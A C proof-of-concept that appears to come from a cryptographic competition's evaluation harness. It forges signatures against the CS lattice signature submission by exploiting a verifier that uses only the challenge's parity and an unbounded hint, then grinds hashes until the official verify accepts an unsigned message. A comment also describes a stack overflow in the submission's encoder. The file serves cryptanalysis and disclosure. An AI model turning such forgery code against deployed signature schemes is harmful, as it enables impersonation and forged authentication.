/*
 * Universal forgery witness for CS (sign-07).
 *
 * CS_Verify uses the challenge polynomial c only through c mod 2:
 *
 *   - ExchangeModulus(w0, cp) folds cp = z0 - c into v with `-(cp & 1) * q`,
 *     because -q == q (mod 2q).  This is the congruence the bimodal design is
 *     built on, so the term can never depend on more than the parity.
 *   - CheckParityPoly(&cp, cp) reduces the second hash input to LSB(z0 - c).
 *
 * The tau sign bits that CS gains by drawing c from {0,+-1}^n instead of
 * {0,1}^n (submission section 1.1, "larger challenge-polynomial space") are
 * therefore invisible to the verifier, and the challenge space that a forger
 * has to hit is the set of supports, of size C(n,tau) -- not the
 * C(n,tau)*2^tau whose logarithm is the "Entropy of c" row of Table 3.
 *
 * Nothing else constrains a forger.  The hint z[l+1..l+k] is neither bounded
 * nor weight-checked, so w1 = (HighBits(v) + h) mod p is fully attacker
 * chosen, and the only tie between w1 and v is the final
 *
 *     ||(alpha*w1 + LSB(z0-c)*j - v)/2||_inf <= B2 - tau + alpha/4 + 1 + tau*2^(beta-1)
 *
 * check.  Consecutive attainable values of alpha*w1 are alpha apart in Z_2q,
 * so that bound is satisfiable for every v as soon as alpha <= 4*B2', and the
 * bound contains the term alpha/4 by construction -- it is exactly the slack
 * correctness needs to absorb LowBits(w).  So for any challenge support S a
 * forger can write down z0 = z1 = 0 and a hint that passes every norm check
 * in CS_Verify, for free, with no secret key and no lattice reduction.
 *
 * What is left is to make the random oracle agree: grind the free hint until
 * SampleInBall(H(mu, w1, LSB(z0-c))) has support exactly S.  That costs
 * C(n,tau) hash calls -- 2^108.08 for CS-128 against a claimed 128 bits, and
 * 2^54 under Grover.
 *
 * This reproducer therefore runs two checks:
 *
 *   sig-forge-transcript  at the submitted parameters.  Builds the free
 *       transcript for an arbitrary attacker-chosen support and shows, using
 *       the submission's own sigEncode/sigDecode and its own check functions,
 *       that every condition in CS_Verify passes except the hash equality,
 *       and reports how many distinct hints pass.
 *
 *   sig-forge-grind       runs the grind to completion and requires the
 *       library's official sig_verify() to accept a signature on a message
 *       that was never signed.  At the submitted parameters this is 2^108
 *       work and the check reports NOT-CONFIRMED once the trial budget runs
 *       out; it is expected to confirm only for the scaled-down instance
 *       built from the same sources by patches/scaled-tau3/params.h, whose
 *       tau is smaller and the encoding/bound constants receive the
 *       compensating edits documented in that file.
 *
 * Key generation and the final verdict go through the submitted API only.  The
 * transcript construction and the grinder call the submission's own compiled
 * sources, linked into this executable; no submission file is modified.
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <inttypes.h>
#include <math.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "link_common.h"
#include "link_sig.h"

/* params.h #defines n, k, l, q, tau, alpha, beta, N, H, ... as object-like
 * macros, so it has to come after every other header and no identifier below
 * may collide with one.  Local names are upper case or prefixed for that
 * reason. */
#include "cs.h"

#define PP            (2 * q / alpha)   /* hint modulus p, a power of two */
#define KN            (k * n)
#define MU_BYTES      (HBYTES + k * POLYW_PACKEDBYTES + n / 8)
#define Z2_BOUND      (B2 - tau + alpha / 4 + 1 + tau * (1 << (beta - 1)))
#define ZDIM          (1 + l + k)
#define DEFAULT_TRIALS 20000000ull

static const char *CHECK_TRANSCRIPT = "sig-forge-transcript";
static const char *CHECK_GRIND      = "sig-forge-grind";

static ngcc_sig_api_t API;
static const ngcc_meta_sig_t *META;

static void die(const char *what)
{
    fprintf(stderr, "forgery: %s\n", what);
    exit(2);
}

/* ---------------------------------------------------------------- helpers */

/* One coefficient of HalfCenterModVector(), the last step of CS_Verify. */
static int32_t half_center_one(int32_t x)
{
    int32_t t = x >> 1;
    t += (t >> 31) & q;
    t -= (((q >> 1) - t) >> 31) & q;
    return t;
}

static int32_t abs32(int32_t x) { return x < 0 ? -x : x; }

static double log2_binom(int NN, int TT)
{
    double r = 0.0;
    for (int I = 0; I < TT; I++) r += log2((double)(NN - I) / (double)(I + 1));
    return r;
}

/*
 * The hint is rANS coded with a fixed model (dsyms_z2: P(h=0) = 610/1024,
 * P(h=+-1) = 196/1024, P(h=+-2) = 10/1024) into POLYZ2_PACKEDBYTES-2 bytes, so
 * a forged hint has to be compressible as well as norm-legal.  Restricting it
 * to |h| <= HINT_MAX on a prefix of FREE_MAX coefficients and h = 0 elsewhere
 * costs about 768*0.75 + 256*1.64 bits ~ 125 bytes against the 153 available,
 * and leaves a pool of 3^256 = 2^406 hints -- far more than the C(n,tau)
 * trials the grind needs.
 *
 * Staying this far under the limit also keeps clear of a separate defect: the
 * submitted sigEncode() lets encode_rans() memcpy its result into a
 * uint8_t buf[2*POLYZ2_PACKEDBYTES] scratch array and only afterwards checks
 * the length against POLYZ2_PACKEDBYTES-2, so a hint whose encoding exceeds
 * 2*POLYZ2_PACKEDBYTES bytes smashes the encoder's stack frame before the
 * check runs.  Only the signer's own encoder is affected; a verifier never
 * runs it, and the forgery below never goes near the limit.
 */
#define HINT_MAX 1
#define FREE_MAX 256

/* Attacker state: everything that is fixed once the target support is chosen. */
typedef struct {
    poly     A[k][l];
    poly     t1ntt[k];          /* NTT(t1 << beta), as CS_Verify forms it */
    poly     z0, z1[l];         /* the response, chosen freely (we use 0) */
    poly     v[k];              /* the v that CS_Verify reconstructs */
    poly     hbv[k];            /* HighBits(v) */
    poly     parity;            /* LSB(z0 - c) = support indicator of c */
    int32_t  support[tau];      /* the chosen challenge support S */
    uint8_t  mu[MU_BYTES];      /* mu[0..HBYTES) = H(H(pk) || M); rest is ground */
    uint8_t  n_admissible[KN];  /* w1 values in [0,p) that pass the z2' bound */
    uint8_t  choice[KN][2 * HINT_MAX + 1];  /* ... of those, the compressible ones */
    uint8_t  n_choice[KN];
    uint8_t  base[KN];          /* the |h| = 0 choice, used outside the prefix */
    int      free_idx[FREE_MAX];/* coefficients the grinder varies */
    int      n_free;            /* how many that is */
    double   log2_pool_all;     /* norm-legal hints */
    double   log2_pool_enc;     /* norm-legal AND ground over, i.e. usable */
} attack_t;

/*
 * Rebuild the v that CS_Verify derives from (pk, z0, z1, c).  Same calls in
 * the same order as CS_Verify, using the submission's own routines.  Only the
 * parity of `cp` reaches v, which is the whole point, so a support indicator
 * stands in for the real z0 - c.
 */
static void rebuild_v(attack_t *at)
{
    poly zn[1 + l], acc[k], scal[k], tmp;
    int I;

    /* NTT() takes a poly* and may work in place, so feed it copies. */
    tmp = at->z0;
    zn[0] = NTT(&tmp);
    for (I = 0; I < l; I++) {
        tmp = at->z1[I];
        zn[1 + I] = NTT(&tmp);
    }
    MatrixVectorNTT(acc, at->A, zn + 1);
    ScalarVectorNTT(scal, zn[0], at->t1ntt);
    SubVector(at->v, acc, scal);
    for (I = 0; I < k; I++) INTT(&at->v[I]);
    LazyReductionVector(at->v);
    ExchangeModulus(at->v, at->parity);
    HighBitsVector(at->hbv, at->v);
}

/*
 * For every one of the k*n hint coefficients, list the w1 values in [0, p)
 * that keep the final CheckNormVector of CS_Verify happy.  Returns 0 if some
 * coefficient has no admissible value (which would mean alpha > 4*B2').
 */
static int collect_admissible(attack_t *at)
{
    int I, J, cand, ok = 1;

    at->log2_pool_all = 0.0;
    at->log2_pool_enc = 0.0;
    at->n_free = 0;
    for (I = 0; I < k; I++) {
        for (J = 0; J < n; J++) {
            int idx = I * n + J, cnt = 0, nch = 0, have_base = 0;
            int32_t hbv = at->hbv[I].coeffs[J];
            int32_t best = 0, best_mag = PP;
            for (cand = 0; cand < PP; cand++) {
                int32_t x = alpha * cand - at->v[I].coeffs[J]
                          + (I == 0 ? at->parity.coeffs[J] : 0);
                int32_t hmag;
                if (x & 1) continue;
                if (abs32(half_center_one(x)) > Z2_BOUND) continue;
                cnt++;
                /* h = (cand - HighBits(v)) mod+- p; keep the small ones */
                hmag = (cand - hbv) & (PP - 1);
                if (hmag > PP / 2) hmag -= PP;
                hmag = abs32(hmag);
                if (hmag < best_mag) { best_mag = hmag; best = cand; }
                if (hmag <= HINT_MAX) at->choice[idx][nch++] = (uint8_t)cand;
                if (hmag == 0) have_base = 1;
            }
            at->n_admissible[idx] = (uint8_t)cnt;
            at->n_choice[idx] = (uint8_t)nch;
            at->base[idx] = (uint8_t)best;
            if (cnt == 0) { ok = 0; continue; }
            at->log2_pool_all += log2((double)cnt);
            /* Only a prefix is varied, so that the encoding stays small. */
            if (nch > 1 && have_base && at->n_free < FREE_MAX) {
                at->free_idx[at->n_free++] = idx;
                at->log2_pool_enc += log2((double)nch);
            }
        }
    }
    return ok;
}

/* Turn a choice of w1 into the hint the signature carries: h = (w1 - HighBits(v)) mod+- p. */
static void hint_from_w1(poly *hint, const poly *w1, const attack_t *at)
{
    hModpVector(hint, w1, at->hbv, 1);
}

/* Pack (cwave, z0, z1, hint) with the submission's own sigEncode. */
static int pack_signature(uint8_t *sig, const uint8_t *cwave,
                          const attack_t *at, const poly *hint)
{
    poly z[ZDIM];
    int I;

    z[0] = at->z0;
    for (I = 0; I < l; I++) z[1 + I] = at->z1[I];
    for (I = 0; I < k; I++) z[1 + l + I] = hint[I];
    return sigEncode(sig, cwave, z);
}

/* The two hash inputs CS_Verify recomputes, for a given w1. */
static void commitment_hash(uint8_t cwave[HBYTES], attack_t *at, const poly *w1)
{
    w1Encode(at->mu + HBYTES, w1);
    SimpleBitPack(at->mu + HBYTES + k * POLYW_PACKEDBYTES, &at->parity, 1);
    H(cwave, HBYTES, at->mu, MU_BYTES);
}

static int support_matches(const int32_t *coords, const int32_t *want)
{
    int I;
    for (I = 0; I < tau; I++)
        if (coords[I] != want[I]) return 0;
    return 1;
}

/* ------------------------------------------------------------ setup */

static uint64_t rng_state = 0x243f6a8885a308d3ull;

static uint64_t rnd64(uint64_t *s)
{
    *s ^= *s << 13; *s ^= *s >> 7; *s ^= *s << 17;
    return *s;
}

/*
 * Choose the target support.  Any tau-subset will do; taking the support of
 * SampleInBall on an arbitrary string keeps it in the form the grinder has to
 * match (sorted, as SampleInBall reports it).
 */
static void choose_support(attack_t *at, const uint8_t *seed32)
{
    poly c;
    int32_t coords[tau];

    SampleInBall(&c, coords, seed32);
    memcpy(at->support, coords, sizeof at->support);
    for (int I = 0; I < n; I++) at->parity.coeffs[I] = 0;
    for (int I = 0; I < tau; I++) at->parity.coeffs[at->support[I]] = 1;
}

static void attack_init(attack_t *at, const uint8_t *pk, const uint8_t *msg,
                        size_t msg_len, const uint8_t *support_seed)
{
    uint8_t rho[SEEDBYTES], hpk[HBYTES], *buf;
    poly t1[k];
    int I, J;

    pkDecode(rho, t1, pk);
    ExpandA(at->A, rho);
    ShiftLeftVector(t1, beta);
    for (I = 0; I < k; I++) at->t1ntt[I] = NTT(&t1[I]);

    /* z0 = 0, z1 = 0: any short response works, and zero makes it plain that
     * no lattice problem is being solved.  CS_Verify has no z != 0 check. */
    for (I = 0; I < n; I++) at->z0.coeffs[I] = 0;
    for (I = 0; I < l; I++)
        for (J = 0; J < n; J++) at->z1[I].coeffs[J] = 0;

    choose_support(at, support_seed);
    rebuild_v(at);
    if (!collect_admissible(at))
        die("no admissible hint: alpha > 4*B2' (would contradict the bound's alpha/4 term)");

    /* mu = H(H(pk) || M), exactly as CS_Verify derives it */
    H(hpk, HBYTES, pk, PUBLICKEYBYTES);
    buf = malloc(HBYTES + msg_len);
    if (!buf) die("oom");
    memcpy(buf, hpk, HBYTES);
    memcpy(buf + HBYTES, msg, msg_len);
    H(at->mu, HBYTES, buf, HBYTES + msg_len);
    free(buf);
}

/*
 * A hint the grinder may use: h = 0 everywhere except on the free prefix,
 * where it takes any value with |h| <= HINT_MAX that still passes the z2'
 * bound.  Every draw is norm-legal by construction and compresses well
 * inside POLYZ2_PACKEDBYTES.
 */
static void pick_w1(poly *w1, const attack_t *at, uint64_t *seed)
{
    int I;

    for (I = 0; I < KN; I++)
        w1[I / n].coeffs[I % n] = at->base[I];
    for (I = 0; I < at->n_free; I++) {
        int idx = at->free_idx[I];
        w1[idx / n].coeffs[idx % n] =
            at->choice[idx][rnd64(seed) % at->n_choice[idx]];
    }
}

/* --------------------------------------------- check 1: free transcript */

/*
 * Replay every condition of CS_Verify on the forged transcript with the
 * submission's own functions and report which ones hold.  The hash equality
 * is the only one that may fail.
 */
static int check_transcript(const uint8_t *pk, const uint8_t *msg, size_t msg_len,
                            int verbose)
{
    static attack_t at;
    uint8_t sig[SIGNATUREBYTES], cwave[HBYTES], cwave_dec[HBYTES];
    uint8_t seed32[HBYTES];
    poly w1[k], hint[k], zdec[ZDIM], w1rec[k], cp;
    uint64_t seed = rng_state;
    int I, J, pass_decode, pass_z0, pass_z1, pass_z2, w1_ok = 1;
    unsigned long long sig_len;

    for (I = 0; I < HBYTES; I++) seed32[I] = (uint8_t)(0xA5 + I);
    attack_init(&at, pk, msg, msg_len, seed32);

    pick_w1(w1, &at, &seed);
    hint_from_w1(hint, w1, &at);
    commitment_hash(cwave, &at, w1);

    if (pack_signature(sig, cwave, &at, hint) != 0)
        die("sigEncode rejected the forged hint");

    /* The submission's own decoder has to accept what we packed. */
    pass_decode = (sigDecode(cwave_dec, zdec, sig) == 0)
               && memcmp(cwave_dec, cwave, HBYTES) == 0;

    /* Norm checks, verbatim from CS_Verify. */
    pass_z0 = !CheckNormPoly(&zdec[0], B0 - N);
    pass_z1 = !CheckNormVector(zdec + 1, l, B1 - tau);

    /* The hint really does put w1 where we wanted it. */
    hModpVector(w1rec, at.hbv, zdec + 1 + l, 0);
    for (I = 0; I < k && w1_ok; I++)
        for (J = 0; J < n; J++)
            if (w1rec[I].coeffs[J] != w1[I].coeffs[J]) { w1_ok = 0; break; }

    /* Final z2' bound, verbatim from CS_Verify. */
    cp = at.parity;
    ScalarVector(w1rec, alpha);
    SubVector(w1rec, w1rec, at.v);
    AddPoly(&w1rec[0], &w1rec[0], &cp);
    HalfCenterModVector(w1rec);
    pass_z2 = !CheckNormVector(w1rec, k, Z2_BOUND);

    /* And the library, through the submitted API, must reject it -- the hash
     * binding is the one thing a free transcript cannot satisfy. */
    sig_len = META->sn_len;
    int lib_verdict = API.verify((unsigned char *)pk, META->pk_len, sig, sig_len,
                                 (unsigned char *)msg, msg_len);

    if (verbose) {
        printf("  support of c chosen by the attacker: %d positions, z0 = z1 = 0\n", tau);
        printf("  sigDecode accepts forged encoding        : %s\n", pass_decode ? "yes" : "no");
        printf("  ||z0||_inf <= B0-N   (%d)                : %s\n", B0 - N, pass_z0 ? "pass" : "fail");
        printf("  ||z1||_inf <= B1-tau (%d)                : %s\n", B1 - tau, pass_z1 ? "pass" : "fail");
        printf("  hint reproduces the chosen w1            : %s\n", w1_ok ? "yes" : "no");
        printf("  ||z2'||_inf <= B2'   (%d)                : %s\n", Z2_BOUND, pass_z2 ? "pass" : "fail");
        printf("  library sig_verify()                     : %s (hash binding unmet)\n",
               lib_verdict == 0 ? "accept" : "reject");
        printf("  hints passing every norm check           : 2^%.0f\n", at.log2_pool_all);
        printf("  ... of those, rANS-encodable and ground  : 2^%.0f over %d coefficients\n",
               at.log2_pool_enc, at.n_free);
        {
            int32_t mx = 0;
            for (I = 0; I < k; I++)
                for (J = 0; J < n; J++)
                    if (abs32(hint[I].coeffs[J]) > mx) mx = abs32(hint[I].coeffs[J]);
            printf("  max |h| over the forged hint             : %d (alphabet +-%d)\n",
                   mx, (2 * (B2 - tau) + tau * (1 << beta)) / alpha + 1);
        }
    }

    int confirmed = pass_decode && pass_z0 && pass_z1 && pass_z2 && w1_ok
                 && lib_verdict != 0
                 && at.log2_pool_enc > log2_binom(n, tau);

    printf("ATTACK %-22s %-24s %s every CS_Verify condition except the hash "
           "equality holds for an attacker-chosen challenge support with "
           "z0 = z1 = 0; 2^%.0f encodable hints remain free to grind; the only "
           "work left is C(n,tau) = 2^%.2f hash calls, not the 2^%.2f of "
           "Table 3\n",
           CHECK_TRANSCRIPT, META->h.instance,
           confirmed ? "CONFIRMED" : "NOT-CONFIRMED",
           at.log2_pool_enc, log2_binom(n, tau), log2_binom(n, tau) + tau);
    return confirmed;
}

/* ------------------------------------------------- check 2: the grind */

/* Shared result slot: the first worker to hit the target support fills it. */
typedef struct {
    volatile int    found;
    pthread_mutex_t lock;
    uint8_t         cwave[HBYTES];
    poly            w1[k];
} hit_t;

typedef struct {
    attack_t          *at;
    hit_t             *hit;
    uint64_t           seed;
    unsigned long long budget;
    unsigned long long tried;
} worker_t;

static void *grind_worker(void *arg)
{
    worker_t *W = (worker_t *)arg;
    attack_t *at = W->at;
    hit_t *hit = W->hit;
    poly w1[k], c;
    int32_t coords[tau];
    uint8_t cwave[HBYTES];
    uint8_t mu_local[MU_BYTES];

    /* Private copy of the hash input: the mu prefix and the parity tail are
     * fixed, only the w1 block changes from trial to trial. */
    memcpy(mu_local, at->mu, MU_BYTES);
    SimpleBitPack(mu_local + HBYTES + k * POLYW_PACKEDBYTES, &at->parity, 1);

    while (!hit->found && W->tried < W->budget) {
        W->tried++;
        pick_w1(w1, at, &W->seed);
        w1Encode(mu_local + HBYTES, w1);
        H(cwave, HBYTES, mu_local, MU_BYTES);
        SampleInBall(&c, coords, cwave);
        if (support_matches(coords, at->support)) {
            pthread_mutex_lock(&hit->lock);
            if (!hit->found) {
                memcpy(hit->cwave, cwave, HBYTES);
                memcpy(hit->w1, w1, sizeof w1);
                hit->found = 1;
            }
            pthread_mutex_unlock(&hit->lock);
            return NULL;
        }
    }
    return NULL;
}

static int check_grind(const uint8_t *pk, const uint8_t *msg, size_t msg_len,
                       unsigned long long budget, int nthreads, int verbose)
{
    static attack_t at;
    static hit_t hit;
    uint8_t seed32[HBYTES], sig[SIGNATUREBYTES];
    poly hint[k];
    pthread_t th[64];
    worker_t W[64];
    unsigned long long total = 0;
    int I;

    if (nthreads < 1) nthreads = 1;
    if (nthreads > 64) nthreads = 64;

    for (I = 0; I < HBYTES; I++) seed32[I] = (uint8_t)(0x5A + I);
    attack_init(&at, pk, msg, msg_len, seed32);

    hit.found = 0;
    pthread_mutex_init(&hit.lock, NULL);
    for (I = 0; I < nthreads; I++) {
        W[I].at = &at;
        W[I].hit = &hit;
        W[I].seed = rng_state + 0x9E3779B97F4A7C15ull * (uint64_t)(I + 1);
        W[I].budget = budget / (unsigned long long)nthreads + 1;
        W[I].tried = 0;
    }
    for (I = 0; I < nthreads; I++)
        if (pthread_create(&th[I], NULL, grind_worker, &W[I]) != 0) die("pthread_create");
    for (I = 0; I < nthreads; I++) pthread_join(th[I], NULL);
    for (I = 0; I < nthreads; I++) total += W[I].tried;

    if (!hit.found) {
        printf("ATTACK %-22s %-24s NOT-CONFIRMED no support hit in %llu trials "
               "(expected C(n,tau) = 2^%.2f with tau = %d)\n",
               CHECK_GRIND, META->h.instance, total, log2_binom(n, tau), tau);
        return 0;
    }

    hint_from_w1(hint, hit.w1, &at);
    if (pack_signature(sig, hit.cwave, &at, hint) != 0)
        die("sigEncode rejected the ground hint");

    int verdict = API.verify((unsigned char *)pk, META->pk_len, sig, META->sn_len,
                             (unsigned char *)msg, msg_len);
    if (verbose)
        printf("  forged after %llu trials; library sig_verify() -> %s\n",
               total, verdict == 0 ? "ACCEPT" : "reject");

    printf("ATTACK %-22s %-24s %s official sig_verify() accepted a forged "
           "signature (z0 = z1 = 0, no secret key, no lattice work) on a "
           "message that was never signed, after %llu of an expected 2^%.2f "
           "hash trials\n",
           CHECK_GRIND, META->h.instance,
           verdict == 0 ? "CONFIRMED" : "NOT-CONFIRMED",
           total, log2_binom(n, tau));
    return verdict == 0;
}

/* ------------------------------------------------------------------ main */

int main(int argc, char **argv)
{
    void *lib;
    const ngcc_meta_common_t *(*meta_fn)(void);
    int (*seed_fn)(const unsigned char *, unsigned long long);
    uint8_t *pk, *sk;
    unsigned long long pk_len, sk_len;
    unsigned long long budget = DEFAULT_TRIALS;
    int nthreads = 4, verbose = 0, control = 0, I;
    int transcript_ok, grind_ok;
    const char *msg = "sign-07 forgery: this message was never signed";
    uint8_t seed[48];

    if (argc < 2) {
        fprintf(stderr,
            "usage: %s <lib<instance>.so> [--trials N] [--threads N] [--control] [--verbose]\n"
            "  --control  expect the grind NOT to succeed (submitted tau: 2^%.0f trials)\n",
            argv[0], log2_binom(n, tau));
        return 2;
    }
    for (I = 2; I < argc; I++) {
        if (!strcmp(argv[I], "--trials") && I + 1 < argc) budget = strtoull(argv[++I], NULL, 0);
        else if (!strcmp(argv[I], "--threads") && I + 1 < argc) nthreads = atoi(argv[++I]);
        else if (!strcmp(argv[I], "--control")) control = 1;
        else if (!strcmp(argv[I], "--verbose")) verbose = 1;
    }

    lib = dlopen(argv[1], RTLD_NOW | RTLD_LOCAL);
    if (!lib) { fprintf(stderr, "forgery: dlopen: %s\n", dlerror()); return 2; }

#define X(field, name)                                                        \
    do { *(void **)&API.field = dlsym(lib, name);                             \
         if (!API.field) die("missing symbol " name); } while (0);
    NGCC_SIG_SYMBOLS
#undef X
    *(void **)&meta_fn = dlsym(lib, "ngcc_meta");
    *(void **)&seed_fn = dlsym(lib, "ngcc_seed");
    if (!meta_fn || !seed_fn) die("library is not an ngcc harness build");
    META = (const ngcc_meta_sig_t *)meta_fn();

    if (META->pk_len != PUBLICKEYBYTES || META->sn_len != SIGNATUREBYTES)
        die("library parameter set does not match the compiled-in params.h");

    for (I = 0; I < 48; I++) seed[I] = (uint8_t)I;
    if (seed_fn(seed, sizeof seed) != 0) die("ngcc_seed failed");

    pk = malloc(META->pk_len); sk = malloc(META->sk_len);
    if (!pk || !sk) die("oom");
    if (API.keygen(pk, &pk_len, sk, &sk_len) != 0) die("keygen failed");

    if (verbose) printf("[%s] %s\n", META->h.instance, CHECK_TRANSCRIPT);
    transcript_ok = check_transcript(pk, (const uint8_t *)msg, strlen(msg), verbose);
    if (verbose) printf("[%s] %s (budget %llu, %d threads)\n",
                        META->h.instance, CHECK_GRIND, budget, nthreads);
    grind_ok = check_grind(pk, (const uint8_t *)msg, strlen(msg), budget, nthreads, verbose);

    free(pk); free(sk); dlclose(lib);
    /* In control mode the grind is expected to run out of budget: C(n,tau) is
     * 2^108 and up at the submitted parameters.  The transcript check must
     * still confirm -- that part costs nothing at any parameter set. */
    return (transcript_ok && (control ? !grind_ok : grind_ok)) ? 0 : 1;
}
